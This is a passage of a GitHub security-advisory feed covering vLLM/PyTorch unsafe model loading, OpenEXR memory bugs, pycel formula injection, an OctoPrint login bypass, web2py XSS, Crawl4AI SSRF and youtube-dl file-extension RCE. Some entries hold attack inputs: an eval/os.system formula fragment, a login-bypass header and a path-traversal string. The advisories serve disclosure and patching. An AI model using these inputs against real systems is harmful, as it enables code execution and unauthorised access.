<h2 id="background-knowledge">Background Knowledge</h2>
<p>When users install VLLM according to the official manual
<img alt="image" src="https://github.com/user-attachments/assets/d17e0bdb-26f2-46d6-adf6-0b17e5ddf5c7"></p>
<p>But the version of PyTorch is specified in the requirements. txt file
<img alt="image" src="https://github.com/user-attachments/assets/94aad622-ad6d-4741-b772-c342727c58c7"></p>
<p>So by default when the user install VLLM, it will install the PyTorch with version 2.5.1
<img alt="image" src="https://github.com/user-attachments/assets/04ff31b0-aad1-490a-963d-00fda91da47b"></p>
<p>In CVE-2025-24357, weights_only=True was used for patching, but we know this is not secure.
Because we found that using Weights_only=True in pyTorch before 2.5.1 was unsafe</p>
<p>Here, we use this interface to prove that it is not safe.
<img alt="image" src="https://github.com/user-attachments/assets/0d86efcd-2aad-42a2-8ac6-cc96b054c925"></p>
<h2 id="fix">Fix</h2>
<p>update PyTorch version to 2.6.0</p>
<h2 id="credit">Credit</h2>
<p>This vulnerability was found By Ji'an Zhou and Li'shuo Song</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/pytorch/pytorch/security/advisories/GHSA-53q9-r3pm-6pq6">https://github.com/pytorch/pytorch/security/advisories/GHSA-53q9-r3pm-6pq6</a></li>
<li><a href="https://github.com/vllm-project/vllm/security/advisories/GHSA-ggpf-24jw-3fcw">https://github.com/vllm-project/vllm/security/advisories/GHSA-ggpf-24jw-3fcw</a></li>
<li><a href="https://github.com/vllm-project/vllm/security/advisories/GHSA-rh4j-5rhw-hr54">https://github.com/vllm-project/vllm/security/advisories/GHSA-rh4j-5rhw-hr54</a></li>
<li><a href="https://github.com/advisories/GHSA-ggpf-24jw-3fcw">https://github.com/advisories/GHSA-ggpf-24jw-3fcw</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-ggpf-24jw-3fcw</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2025-04-23T02:26:06.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[OpenEXR] OpenEXR invalid read]]></title>
        <id>https://github.com/advisories/GHSA-8m57-j273-2qg9</id>
        <link href="https://github.com/advisories/GHSA-8m57-j273-2qg9"/>
        <updated>2025-04-22T18:45:45.000Z</updated>
        <content type="html"><![CDATA[<p>In OpenEXR 2.2.0, an invalid read of size 1 in the getBits function in ImfHuf.cpp could cause the application to crash.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2017-9112">https://nvd.nist.gov/vuln/detail/CVE-2017-9112</a></li>
<li><a href="https://github.com/openexr/openexr/issues/232">https://github.com/openexr/openexr/issues/232</a></li>
<li><a href="https://github.com/openexr/openexr/pull/233">https://github.com/openexr/openexr/pull/233</a></li>
<li><a href="https://github.com/openexr/openexr/releases/tag/v2.2.1">https://github.com/openexr/openexr/releases/tag/v2.2.1</a></li>
<li><a href="https://lists.debian.org/debian-lts-announce/2020/08/msg00056.html">https://lists.debian.org/debian-lts-announce/2020/08/msg00056.html</a></li>
<li><a href="http://www.openwall.com/lists/oss-security/2017/05/12/5">http://www.openwall.com/lists/oss-security/2017/05/12/5</a></li>
<li><a href="https://usn.ubuntu.com/4148-1">https://usn.ubuntu.com/4148-1</a></li>
<li><a href="https://github.com/advisories/GHSA-8m57-j273-2qg9">https://github.com/advisories/GHSA-8m57-j273-2qg9</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-8m57-j273-2qg9</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2022-05-13T01:17:50.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[OpenEXR] OpenEXR invalid write]]></title>
        <id>https://github.com/advisories/GHSA-qxh9-r8xw-7v99</id>
        <link href="https://github.com/advisories/GHSA-qxh9-r8xw-7v99"/>
        <updated>2025-04-22T18:45:30.000Z</updated>
        <content type="html"><![CDATA[<p>In OpenEXR 2.2.0, an invalid write of size 8 in the storeSSE function in ImfOptimizedPixelReading.h could cause the application to crash or execute arbitrary code.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2017-9111">https://nvd.nist.gov/vuln/detail/CVE-2017-9111</a></li>
<li><a href="https://github.com/openexr/openexr/issues/232">https://github.com/openexr/openexr/issues/232</a></li>
<li><a href="https://github.com/openexr/openexr/pull/233">https://github.com/openexr/openexr/pull/233</a></li>
<li><a href="https://github.com/openexr/openexr/releases/tag/v2.2.1">https://github.com/openexr/openexr/releases/tag/v2.2.1</a></li>
<li><a href="https://lists.debian.org/debian-lts-announce/2020/08/msg00056.html">https://lists.debian.org/debian-lts-announce/2020/08/msg00056.html</a></li>
<li><a href="https://www.debian.org/security/2020/dsa-4755">https://www.debian.org/security/2020/dsa-4755</a></li>
<li><a href="http://lists.opensuse.org/opensuse-security-announce/2019-07/msg00060.html">http://lists.opensuse.org/opensuse-security-announce/2019-07/msg00060.html</a></li>
<li><a href="http://lists.opensuse.org/opensuse-security-announce/2019-08/msg00000.html">http://lists.opensuse.org/opensuse-security-announce/2019-08/msg00000.html</a></li>
<li><a href="http://www.openwall.com/lists/oss-security/2017/05/12/5">http://www.openwall.com/lists/oss-security/2017/05/12/5</a></li>
<li><a href="https://usn.ubuntu.com/4148-1">https://usn.ubuntu.com/4148-1</a></li>
<li><a href="https://usn.ubuntu.com/4339-1">https://usn.ubuntu.com/4339-1</a></li>
<li><a href="https://github.com/advisories/GHSA-qxh9-r8xw-7v99">https://github.com/advisories/GHSA-qxh9-r8xw-7v99</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-qxh9-r8xw-7v99</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2022-05-13T01:17:50.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[pycel] Pycel allows code injection via a crafted formula]]></title>
        <id>https://github.com/advisories/GHSA-pw67-xjhq-389w</id>
        <link href="https://github.com/advisories/GHSA-pw67-xjhq-389w"/>
        <updated>2025-04-22T17:04:12.000Z</updated>
        <content type="html"><![CDATA[<p>Pycel through 1.0b30, when operating on an untrusted spreadsheet, allows code execution via a crafted formula in a cell, such as one beginning with the <code>=IF(A1=200, eval("__import__('os').system(</code> substring.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-53924">https://nvd.nist.gov/vuln/detail/CVE-2024-53924</a></li>
<li><a href="https://gist.github.com/aelmosalamy/cb098e61939718d2bb248fd1cc94f287">https://gist.github.com/aelmosalamy/cb098e61939718d2bb248fd1cc94f287</a></li>
<li><a href="https://github.com/dgorissen/pycel">https://github.com/dgorissen/pycel</a></li>
<li><a href="https://github.com/stephenrauch/pycel">https://github.com/stephenrauch/pycel</a></li>
<li><a href="https://pypi.org/project/pycel">https://pypi.org/project/pycel</a></li>
<li><a href="https://github.com/advisories/GHSA-pw67-xjhq-389w">https://github.com/advisories/GHSA-pw67-xjhq-389w</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-pw67-xjhq-389w</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2025-04-17T18:31:23.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[octoprint] OctoPrint Authenticated Reverse Proxy Page Authentication Bypass]]></title>
        <id>https://github.com/advisories/GHSA-qw93-h6pf-226x</id>
        <link href="https://github.com/advisories/GHSA-qw93-h6pf-226x"/>
        <updated>2025-04-23T15:20:11.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>OctoPrint versions up until and including 1.10.3 contain a vulnerability that allows an attacker to bypass the login redirect and directly access the rendered HTML of certain frontend pages. </p>
<p>The impact on data exposure is minimal because, typically, data is loaded via API requests that correctly enforce user authentication. In the current codebase, cases where data is directly embedded in the page content are rare. However, one notable exception is the authenticated variant of the reverse proxy test page, which displays the IP addresses of configured reverse proxies. </p>
<p>The primary risk lies in potential future modifications to the codebase that might incorrectly rely on the vulnerable internal functions for authentication checks, leading to security vulnerabilities.</p>
<h3 id="patches">Patches</h3>
<p>The vulnerability has been patched in version 1.11.0.</p>
<h3 id="details">Details</h3>
<p>An authentication bypass vulnerability exists in the following functions defined in <a href="https://github.com/OctoPrint/OctoPrint/blob/d79a0d20f3f1c7f2edb56dedda3b70267a937e65/src/octoprint/server/util/__init__.py">octoprint/server/util/init.py</a>:</p>
<ul>
<li><code>require_login</code></li>
<li><code>require_login_with</code></li>
<li><code>require_fresh_login_with</code></li>
</ul>
<p>By adding the HTTP header <code>X-Preemptive-Recording: yes</code> to HTTP requests, these functions allow requests to proceed without redirecting to the login screen, effectively bypassing the login mechanism in the frontend. However, this only grants access to frontend page content, while authenticated API endpoints still enforce proper session validation.</p>
<h3 id="credits">Credits</h3>
<p>This vulnerability was discovered and responsibly disclosed to OctoPrint by Jacopo Tediosi</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/OctoPrint/OctoPrint/security/advisories/GHSA-qw93-h6pf-226x">https://github.com/OctoPrint/OctoPrint/security/advisories/GHSA-qw93-h6pf-226x</a></li>
<li><a href="https://github.com/OctoPrint/OctoPrint/commit/41ff431014edfa18ca1a01897b10463934dc7fc2">https://github.com/OctoPrint/OctoPrint/commit/41ff431014edfa18ca1a01897b10463934dc7fc2</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-32788">https://nvd.nist.gov/vuln/detail/CVE-2025-32788</a></li>
<li><a href="https://github.com/advisories/GHSA-qw93-h6pf-226x">https://github.com/advisories/GHSA-qw93-h6pf-226x</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-qw93-h6pf-226x</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2025-04-22T16:49:43.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[web2py] Web2py Reflected XSS vulnerability]]></title>
        <id>https://github.com/advisories/GHSA-pvcp-73cg-6f77</id>
        <link href="https://github.com/advisories/GHSA-pvcp-73cg-6f77"/>
        <updated>2025-04-21T22:52:17.000Z</updated>
        <content type="html"><![CDATA[<p>Web2py versions 2.14.5 and below was affected by Reflected XSS vulnerability, which allows an attacker to perform an XSS attack on logged in user (admin).</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2016-4807">https://nvd.nist.gov/vuln/detail/CVE-2016-4807</a></li>
<li><a href="http://packetstormsecurity.com/files/137070/Web2py-2.14.5-CSRF-XSS-Local-File-Inclusion.html">http://packetstormsecurity.com/files/137070/Web2py-2.14.5-CSRF-XSS-Local-File-Inclusion.html</a></li>
<li><a href="https://www.exploit-db.com/exploits/39821">https://www.exploit-db.com/exploits/39821</a></li>
<li><a href="https://github.com/advisories/GHSA-pvcp-73cg-6f77">https://github.com/advisories/GHSA-pvcp-73cg-6f77</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-pvcp-73cg-6f77</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2022-05-17T03:05:11.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[Crawl4AI] Crawl4AI SSRF vulnerability]]></title>
        <id>https://github.com/advisories/GHSA-445m-27cf-gr3x</id>
        <link href="https://github.com/advisories/GHSA-445m-27cf-gr3x"/>
        <updated>2025-04-21T21:54:26.000Z</updated>
        <content type="html"><![CDATA[<p>Crawl4AI &lt;=0.4.247 is vulnerable to SSRF in /crawl4ai/async_dispatcher.py.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-28197">https://nvd.nist.gov/vuln/detail/CVE-2025-28197</a></li>
<li><a href="https://gist.github.com/AndrewDzzz/f49e79b09ce0643ee1fc2a829e8875e0">https://gist.github.com/AndrewDzzz/f49e79b09ce0643ee1fc2a829e8875e0</a></li>
<li><a href="https://github.com/advisories/GHSA-445m-27cf-gr3x">https://github.com/advisories/GHSA-445m-27cf-gr3x</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-445m-27cf-gr3x</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2025-04-18T21:31:20.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[youtube-dl] youtube-dl vulnerable to file system modification and RCE through improper file-extension sanitization]]></title>
        <id>https://github.com/advisories/GHSA-22fp-mf44-f2mq</id>
        <link href="https://github.com/advisories/GHSA-22fp-mf44-f2mq"/>
        <updated>2025-04-18T20:24:10.000Z</updated>
        <content type="html"><![CDATA[<h4 id="description">Description</h4>
<p>This advisory follows the security advisory <a href="https://github.com/yt-dlp/yt-dlp/security/advisories/GHSA-79w7-vh3h-8g4j">GHSA-79w7-vh3h-8g4j published by the <em>yt-dlp/yt-dlp</em> project</a> to aid remediation of the issue in the <em>ytdl-org/youtube-dl</em> project.</p>
<h3 id="vulnerability">Vulnerability</h3>
<p><em>youtube-dl</em> does not limit the extensions of downloaded files, which could lead to arbitrary filenames being created in the download folder (and path traversal on Windows). </p>
<h3 id="impact">Impact</h3>
<p>Since <em>youtube-dl</em> also reads config from the working directory (and, on Windows, executables will be executed from the <em>youtube-dl</em> directory by default) the vulnerability could allow the unwanted execution of local code, including downloads masquerading as, eg, subtitles.</p>
<h3 id="patches">Patches</h3>
<p>The versions of <em>youtube-dl</em> listed as <em>Patched</em> remediate this vulnerability by disallowing path separators and whitelisting allowed extensions. As a result, some very uncommon extensions might not get downloaded.</p>
<h3 id="workarounds">Workarounds</h3>
<p>Any/all of the below considerations may limit exposure in case it is necessary to use a vulnerable version</p>
<ul>
<li>have <code>.%(ext)s</code> at the end of the output template</li>
<li>download from websites that you trust</li>
<li>do not download to a directory within the executable search <code>PATH</code> or other sensitive locations, such as your user directory or system directories</li>
<li>in Windows versions that support it, set <a href="https://stackoverflow.com/a/50118548"><code>NoDefaultCurrentDirectoryInExePath</code></a> to prevent the <em>cmd</em> shell's executable search adding the default directory before <code>PATH</code></li>
<li>consider that the path traversal vulnerability as a result of resolving <code>non_existent_dir\..\..\target</code> does not exist in Linux or macOS</li>
<li>ensure the extension of the media to download is a common video/audio/... one (use <code>--get-filename</code>)</li>
<li>omit any of the subtitle options (<code>--write-subs</code>/<code> --write-srt</code>, <code>--write-auto-subs</code>/<code>--write-automatic-subs</code>, <code>--all-subs</code>).</li>
</ul>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/yt-dlp/yt-dlp/security/advisories/GHSA-79w7-vh3h-8g4j">GHSA-79w7-vh3h-8g4j</a></li>
<li><a href="https://github.com/ytdl-org/youtube-dl/pull/32830">https://github.com/ytdl-org/youtube-dl/pull/32830</a></li>
</ul>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/dirkf/youtube-dl/security/advisories/GHSA-22fp-mf44-f2mq">https://github.com/dirkf/youtube-dl/security/advisories/GHSA-22fp-mf44-f2mq</a></li>
<li><a href="https://github.com/yt-dlp/yt-dlp/security/advisories/GHSA-79w7-vh3h-8g4j">https://github.com/yt-dlp/yt-dlp/security/advisories/GHSA-79w7-vh3h-8g4j</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-38519">https://nvd.nist.gov/vuln/detail/CVE-2024-38519</a></li>
<li><a href="https://github.com/ytdl-org/youtube-dl/pull/32830">https://github.com/ytdl-org/youtube-dl/pull/32830</a></li>
<li><a href="https://github.com/ytdl-org/youtube-dl/commit/d42a222ed541b96649396ef00e19552aef0f09ec">https://github.com/ytdl-org/youtube-dl/commit/d42a222ed541b96649396ef00e19552aef0f09ec</a></li>
<li><a href="https://securitylab.github.com/advisories/GHSL-2024-089_youtube-dl">https://securitylab.github.com/advisories/GHSL-2024-089_youtube-dl</a></li>
<li><a href="https://github.com/advisories/GHSA-22fp-mf44-f2mq">https://github.com/advisories/GHSA-22fp-mf44-f2mq</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-22fp-mf44-f2mq</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2025-04-18T20:24:07.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[torch] PyTorch: `torch.load` with `weights_only=True` leads to remote code execution]]></title>
        <id>https://github.com/advisories/GHSA-53q9-r3pm-6pq6</id>
        <link href="https://github.com/advisories/GHSA-53q9-r3pm-6pq6"/>
        <updated>2025-04-18T18:34:25.000Z</updated>
        <content type="html"><![CDATA[<h1 id="description">Description</h1>
<p>I found a Remote Command Execution (RCE) vulnerability in the PyTorch. When load model using torch.load with weights_only=True, it can still achieve RCE.  </p>
<h1 id="background-knowledge">Background knowledge</h1>
<p><a href="https://github.com/pytorch/pytorch/security">https://github.com/pytorch/pytorch/security</a> 
 As you can see, the PyTorch official documentation considers using <code>torch.load()</code> with <code>weights_only=True</code> to be safe.
<img alt="image" src="https://github.com/user-attachments/assets/fdaa8520-d66a-473a-ab1f-163d793de298">
Since everyone knows that weights_only=False is unsafe, so they will use the  weights_only=True to mitigate the security issue.
But now, I just proved that even if you use weights_only=True, it still can achieve RCE.
So it is time to update your PyTorch version~.</p>
<h1 id="credit">Credit</h1>
<p>This vulnerability was found by Ji'an Zhou.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/pytorch/pytorch/security/advisories/GHSA-53q9-r3pm-6pq6">https://github.com/pytorch/pytorch/security/advisories/GHSA-53q9-r3pm-6pq6</a></li>
<li><a href="https://github.com/pytorch/pytorch/commit/8d4b8a920a2172523deb95bf20e8e52d50649c04">https://github.com/pytorch/pytorch/commit/8d4b8a920a2172523deb95bf20e8e52d50649c04</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-32434">https://nvd.nist.gov/vuln/detail/CVE-2025-32434</a></li>
<li><a href="https://github.com/advisories/GHSA-53q9-r3pm-6pq6">https://github.com/advisories/GHSA-53q9-r3pm-6pq6</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-53q9-r3pm-6pq6</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2025-04-18T15:19:28.000Z</published>
    </entry>
</feed>